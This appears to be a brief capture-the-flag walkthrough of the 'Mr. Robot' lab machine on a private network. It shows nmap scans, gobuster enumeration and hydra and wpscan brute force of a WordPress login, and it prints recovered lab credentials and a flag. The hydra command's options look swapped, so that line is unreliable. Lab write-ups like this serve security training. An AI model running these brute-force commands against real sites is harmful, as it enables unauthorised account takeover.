We begin enumeration by scanning our net work with nmap
```
nmap -sV -sP 10.0.0.93/24
```
We find the target ip and do another nmap scan on the target box to find open ports:

```
nmap -sV -sC -vv -T4 10.0.0.48
```
We then enumerate with gobuster and see if there is a robots file and we find the first key:

key1: 073403c8a58a1f80d943455fb30724b9

We also find what looks to be a password list listed in the robots.txt file.

```
gobuster dir -u http://10.0.0.48/ -w=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Continuing with enumeration we begin to look at the websites looking for user credentials and any clues.
We find a wordpress admin site and decide to use ```burpsuite``` to intercept the request. Since this is a machine based on the series mr.robot we are going to use hydra and combine the name ```Elliot``` who is the main character of the series and attempt to brute force the wordpress log in form. We find the username and password for the wp site.
```Elliot ER28-0652```
commands used: 
```
hydra -l fsocity.dic -P 123  10.0.0.48 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```

```
 wpscan -t 10000 --url http://10.0.0.48 --usernames Elliot --passwords fsoc.dic
```
